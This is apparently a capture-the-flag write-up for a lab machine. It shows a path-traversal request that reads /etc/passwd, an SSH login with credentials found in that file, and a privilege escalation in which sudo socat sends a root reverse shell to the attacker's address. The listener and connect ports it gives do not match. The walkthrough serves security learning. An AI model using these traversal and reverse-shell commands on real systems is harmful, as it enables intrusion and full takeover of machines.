this is LFI lab, let's try opening up the posts and see what we can do.

![lfi?](https://i.imgur.com/cFEhBOr.png)

we got a input paramere, where you can modify values. let's try reading out `/etc/psswd` file. this is public readble file in linux.

```bash
http://<machine-ip>/article?name=../../../../../../etc/passwd
```

Turns out we can read the local `/etc/passwd` file.

![lfi-2](https://i.imgur.com/DwC4jF7.png)

and we got a credentials commented out in file.

trying `SSH` to access with found creds.

```bash
┌──(anir0y㉿kali)-[~/share/thm/room/inclusion]
└─$ ssh falconfeast@10.10.206.247
falconfeast@10.10.206.247's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
```

credentials worked! user key in `~/` dir named `user.txt`

## Root

> we have a working `ssh` access to the server, let's try to find out to be a root.

I'm going to start with `sudo -l` command to see if `falconfeast` have any sudo run privileges.

```bash
# user can run socat with no password required. 
falconfeast@inclusion:~$ sudo -l 
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

Nice easy privesc here — we’ve got sudo access for socat, which is essentially a more powerful (if more complex) version of Netcat. In other words, we can use socat to send ourselves a root shell. First, on your own attacking computer, run this command:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:9001
```

This will setup a socat listener on your own machine.

On the remote machine, use this command:

```bash
sudo socat tcp-connect:<your-ip-address>:1234 exec:bash,pty,stderr,setsid,sigint,sane
```

we got the flag!!!

## you can learn more about `socat` in this amazing room: [SHELL](https://tryhackme.com/room/introtoshells)

## Bonus

you could've been got both flag with `web LFI` itself. I don't know that is intented way or not. but hey! you got that option too.
